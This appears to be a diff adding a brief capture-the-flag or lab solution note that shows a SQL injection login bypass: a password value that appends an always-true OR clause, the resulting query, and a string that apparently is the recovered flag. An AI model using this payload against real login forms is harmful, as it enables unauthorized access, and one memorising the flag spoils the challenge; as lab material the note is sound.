@@ -1,0 +1,5 @@
+Here I have to apply SQL injection in a form
+username: anything password: 123" OR "1="1
+Which generates the following query
+SELECT * FROM users WHERE username="anything" AND password="123" OR "1"="1"
+SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
